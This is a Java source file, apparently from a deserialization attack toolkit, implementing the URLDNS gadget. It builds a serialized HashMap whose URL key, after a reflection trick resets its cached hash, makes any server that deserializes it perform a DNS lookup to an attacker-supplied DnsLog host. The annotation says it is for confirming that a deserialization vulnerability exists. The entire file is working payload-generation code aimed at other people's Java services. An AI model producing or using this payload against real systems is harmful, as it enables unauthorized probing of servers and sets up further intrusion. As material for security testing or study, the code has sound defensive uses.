package com.bcvgh.core.unser.gadgets.other;

import com.bcvgh.core.unser.annotation.Description;
import com.bcvgh.core.unser.annotation.RequireParameter;
import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.bcvgh.core.unser.gadgets.ObjectPayload;
import com.bcvgh.core.unser.gadgets.util.Reflections;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

@Description("用于验证是否存在反序列化漏洞")
@RequireParameter("DnsLog")
public class URLDNS implements ObjectPayload {

    @Override
    public  Object getObject(final UnSerInput unSerInput) throws Exception{
        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, unSerInput.getDnsLog(), handler); // URL to use as the Key
        ht.put(u, unSerInput.getDnsLog()); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
        return ht;
    }


    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
